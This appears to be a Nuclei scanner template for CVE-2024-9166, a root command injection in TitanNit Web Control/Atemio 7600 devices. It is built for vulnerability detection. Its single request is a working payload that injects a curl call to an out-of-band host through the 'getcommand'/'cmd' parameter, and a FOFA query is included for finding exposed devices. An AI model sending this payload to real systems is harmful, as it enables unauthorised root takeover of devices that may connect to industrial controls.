id: CVE-2024-9166

info:
  name: TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution
  author: DhiyaneshDk
  severity: critical
  description: |
    The device contains a command injection caused by the 'getcommand' query in the application, letting unauthorized attackers execute system commands with root privileges, exploit requires attacker to send crafted requests.
  impact: |
    Unauthenticated attackers can execute arbitrary system commands with root privileges through command injection in the getcommand query parameter, achieving complete control of the TitanNit Web Control device and potentially pivoting to connected industrial control systems.
  remediation: |
    Apply security patches from TitanNit for Web Control 2.01 and Atemio 7600 to address the command injection vulnerability in the getcommand query parameter.
  reference:
    - https://www.cisa.gov/news-events/ics-advisories/icsa-24-270-03
    - https://www.exploit-db.com/exploits/51853
    - https://github.com/Andrysqui/CVE-2024-9166
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5801.php
  classification:
    cve-id: CVE-2024-9166
    cwe-id: CWE-78
    epss-score: 0.04578
    epss-percentile: 0.88875
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="TitanNit Web Control"
  tags: cve,cve2024,titanit,web-control,oast,rce,ics,vuln

http:
  - raw:
      - |
        @timeout: 20s
        GET /query?getcommand=&cmd=curl+http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: word
        part: body
        words:
          - "titan.css"
# digest: 4a0a00473045022100a181abe236efe80ecedd5ee6cc6c1d5fe5db70cbae617e3b8b8e89673374d38a02206320333e20959b8cc215d382f38b52347ea0ec5641318d51a283fe2bb438bae1:922c64590222798bb761d5b6d8e72950